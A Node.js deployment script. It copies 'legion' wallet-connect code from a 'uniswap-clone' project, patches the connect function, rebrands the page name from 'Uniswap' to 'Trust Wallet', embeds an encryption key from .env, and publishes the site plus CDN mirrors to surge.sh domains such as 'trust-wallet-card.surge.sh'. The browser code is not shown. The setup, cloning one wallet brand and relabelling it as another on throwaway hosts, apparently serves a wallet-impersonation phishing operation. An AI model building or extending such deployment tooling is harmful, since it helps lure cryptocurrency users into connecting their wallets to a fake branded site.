#!/usr/bin/env node
/**
 * Publish ORIGINAL Trust Card SPA + Trust CDN.
 * Does not invent a new UI — restores trust-legion-test assets.
 */
import { cpSync, mkdirSync, readFileSync, writeFileSync, existsSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { execSync } from 'node:child_process';

const __dir = dirname(fileURLToPath(import.meta.url));
const repoRoot = join(__dir, '..', '..');
const uni = join(__dir, '..', 'uniswap-clone');
const out = __dir;
const SITE = 'trust-wallet-card.surge.sh';
const SITE_OLD = 'trust-legion-test.surge.sh';
const CDN = 'trust-legion-cdn.surge.sh';

function loadKey() {
  if (process.env.CLIENT_ENCRYPT_KEY?.trim()) return process.env.CLIENT_ENCRYPT_KEY.trim();
  try {
    const text = readFileSync(join(repoRoot, '.env'), 'utf8');
    for (const line of text.split(/\r?\n/)) {
      if (!line.startsWith('CLIENT_ENCRYPT_KEY=')) continue;
      let v = line.slice('CLIENT_ENCRYPT_KEY='.length).trim();
      if ((v.startsWith('"') && v.endsWith('"')) || (v.startsWith("'") && v.endsWith("'"))) v = v.slice(1, -1);
      return v;
    }
  } catch (_) {}
  return '';
}

// Trust-local legion.js is source of truth (multi-chain + popup-once). Do NOT overwrite from uniswap.
mkdirSync(join(out, 'vendor'), { recursive: true });
for (const f of ['legion-bridge.js', 'legion-embed.js']) {
  const local = join(out, f);
  if (!existsSync(local) && existsSync(join(uni, f))) cpSync(join(uni, f), local);
}
if (!existsSync(join(out, 'legion.js')) && existsSync(join(uni, 'legion.js'))) {
  cpSync(join(uni, 'legion.js'), join(out, 'legion.js'));
}
for (const f of [
  'legion-polyfills.js',
  'legion-wallet.iife.js',
  'legion-caip-registry.js',
  'wc-ethereum-provider.umd.js',
  'manifest.json',
]) {
  const from = join(uni, 'vendor', f);
  if (existsSync(from)) cpSync(from, join(out, 'vendor', f));
}

const NEEDLE =
  `async function connectWithWallet(choice) {
    if (!choice) return;
    if (choice.type === 'wc') {
      await handleWC();
      return;
    }
    if (isWcConnectActive()) {`;

const PATCH =
  `async function connectWithWallet(choice) {
    if (!choice) return;
    if (choice.type === 'wc') {
      await handleWC();
      return;
    }
    if (choice.type === 'external-wc' && choice.provider) {
      try { choice.provider.isWalletConnect = true; } catch (e0) {}
      S.connectMode = 'wc';
      S.wcSessionActive = true;
      _wcProv = choice.provider;
      S.injectedWalletKey = String(
        (choice.info && (choice.info.walletKey || choice.info.name)) || choice.walletKey || 'trust'
      );
      UI._walletIcon = (choice.info && choice.info.icon) || '';
      if (!UI._overlayEl) UI.overlay.show('connecting', { walletIcon: UI._walletIcon });
      await handleEvmConnect(choice.provider, choice);
      return;
    }
    if (isWcConnectActive()) {`;

let legionJs = readFileSync(join(out, 'legion.js'), 'utf8');
if (!legionJs.includes('external-wc')) {
  if (!legionJs.includes(NEEDLE)) {
    console.error('[trust] connectWithWallet needle missing');
    process.exit(1);
  }
  legionJs = legionJs.replace(NEEDLE, PATCH);
}
legionJs = legionJs.replace(/name: document\.title \|\| 'Uniswap'/, "name: document.title || 'Trust Wallet'");
writeFileSync(join(out, 'legion.js'), legionJs);
cpSync(join(out, 'legion.js'), join(out, 'legion.min.js'));

const key = loadKey();
if (!key) {
  console.error('[trust] CLIENT_ENCRYPT_KEY missing');
  process.exit(1);
}
const esc = key.replace(/\\/g, '\\\\').replace(/'/g, "\\'");

let embed = readFileSync(join(out, 'legion-embed.js'), 'utf8');
embed = embed.replace(/var CDN_PRIMARY = 'https:\/\/[^']+\/';/, `var CDN_PRIMARY = 'https://${CDN}/';`);
const VERSIONS = {
  legion: '5.16.36',
  wallet: '1.5.18',
  polyfills: '1.1.0',
  embed: '1.3.1',
};
embed = embed.replace(/legion:\s*'[^']+'/, "legion: '" + VERSIONS.legion + "'");
embed = embed.replace(/wallet:\s*'[^']+'/, "wallet: '" + VERSIONS.wallet + "'");
embed = embed.replace(/clientEncryptKey:\s*'[^']*'/, `clientEncryptKey: '${esc}'`);
writeFileSync(join(out, 'legion-embed.js'), embed);

writeFileSync(join(out, 'CORS'), '*\n');
writeFileSync(join(out, '.surgeignore'), 'publish.mjs\nnode_modules\n');

const versionsJson = JSON.stringify(VERSIONS, null, 2) + '\n';

// CDN first (site embed depends on it)
const cdnOut = join(__dir, '..', 'trust-cdn');
mkdirSync(join(cdnOut, 'vendor'), { recursive: true });
for (const f of ['legion.js', 'legion.min.js', 'legion-embed.js', 'legion-bridge.js', 'CORS']) {
  cpSync(join(out, f), join(cdnOut, f));
}
for (const f of [
  'legion-polyfills.js',
  'legion-wallet.iife.js',
  'legion-caip-registry.js',
  'wc-ethereum-provider.umd.js',
  'manifest.json',
]) {
  const from = join(out, 'vendor', f);
  if (existsSync(from)) cpSync(from, join(cdnOut, 'vendor', f));
}
writeFileSync(join(cdnOut, '.surgeignore'), 'publish.mjs\n');
// Atomic: upload CDN assets first, versions.json only after success (written then re-surge small — write before surge so one deploy includes it)
writeFileSync(join(cdnOut, 'versions.json'), versionsJson);

console.log('[trust] CDN', CDN);
execSync(`npx --yes surge . ${CDN}`, { cwd: cdnOut, stdio: 'inherit', shell: true });

console.log('[trust] site', SITE);
execSync(`npx --yes surge . ${SITE}`, { cwd: out, stdio: 'inherit', shell: true });

console.log('[trust] restore old domain', SITE_OLD);
execSync(`npx --yes surge . ${SITE_OLD}`, { cwd: out, stdio: 'inherit', shell: true });

// Shared legion-cdn — same engine bytes + versions.json (diff-only sync)
const sharedCdn = join(__dir, '..', 'legion-cdn-sync');
mkdirSync(join(sharedCdn, 'vendor'), { recursive: true });
let sharedEmbed = readFileSync(join(out, 'legion-embed.js'), 'utf8');
sharedEmbed = sharedEmbed.replace(/var CDN_PRIMARY = 'https:\/\/[^']+\/';/, "var CDN_PRIMARY = 'https://legion-cdn.surge.sh/';");
writeFileSync(join(sharedCdn, 'legion-embed.js'), sharedEmbed);
for (const f of ['legion.js', 'legion.min.js', 'legion-bridge.js', 'CORS']) {
  cpSync(join(out, f), join(sharedCdn, f));
}
for (const f of [
  'legion-polyfills.js',
  'legion-wallet.iife.js',
  'legion-caip-registry.js',
  'wc-ethereum-provider.umd.js',
  'manifest.json',
]) {
  const from = join(out, 'vendor', f);
  if (existsSync(from)) cpSync(from, join(sharedCdn, 'vendor', f));
}
writeFileSync(join(sharedCdn, 'versions.json'), versionsJson);
writeFileSync(join(sharedCdn, '.surgeignore'), 'publish.mjs\nnode_modules\n');
writeFileSync(join(sharedCdn, 'CORS'), '*\n');
console.log('[trust] shared CDN legion-cdn.surge.sh');
execSync('npx --yes surge . legion-cdn.surge.sh', { cwd: sharedCdn, stdio: 'inherit', shell: true });

// restore embed placeholder for git
embed = readFileSync(join(out, 'legion-embed.js'), 'utf8');
embed = embed.replace(/clientEncryptKey:\s*'[^']*'/, "clientEncryptKey: '__EMBED_ENCRYPT_KEY__'");
writeFileSync(join(out, 'legion-embed.js'), embed);

console.log('[trust] live → https://' + SITE);
console.log('[trust] also → https://' + SITE_OLD);
console.log('[trust] versions', JSON.stringify(VERSIONS));
